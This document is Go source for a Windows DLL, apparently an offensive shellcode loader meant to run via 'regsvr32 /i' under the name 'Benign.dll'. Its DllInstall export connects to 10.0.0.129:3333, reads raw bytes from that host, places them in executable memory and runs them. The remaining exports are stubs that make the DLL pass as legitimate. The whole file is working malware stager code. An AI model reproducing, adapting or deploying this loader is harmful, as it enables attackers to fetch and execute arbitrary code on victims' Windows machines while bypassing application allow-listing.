package main

// PS C:\> regsvr32.exe /i Benign.dll

import (
        "fmt"
        "io/ioutil"
        "net"
        "syscall"
        "unsafe"
)

const (
        MEM_COMMIT             = 0x1000
        MEM_RESERVE            = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40
)

var (
        kernel32      = syscall.MustLoadDLL("kernel32.dll")
        ntdll         = syscall.MustLoadDLL("ntdll.dll")
        VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
        RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

//export EntryPoint
func EntryPoint() bool {
        return true
}

//export DllRegisterServer
func DllRegisterServer() bool {
        return true
}

//export DllUnregisterServer
func DllUnregisterServer() bool {
        return true
}

//export DllInstall
func DllInstall() bool {
        sc := []byte{}

        conn, err := net.Dial("tcp", "10.0.0.129:3333")
        defer conn.Close()
        if err != nil {
                fmt.Println(err.Error())
                return false
        }

        sc, _ = ioutil.ReadAll(conn)
        shellCodeRTLCopyMemory(sc)
        return true
}

func shellCodeRTLCopyMemory(shellcode []byte) {
        addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        if addr == 0 {
                fmt.Println(err.Error())
                return
        }

        _, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
        if err != nil {
                fmt.Println(err.Error())
                return
        }

        _, _, err = syscall.Syscall(addr, 0, 0, 0, 0)
        if err != nil {
                fmt.Println(err.Error())
                return
        }
}

func main() {
}
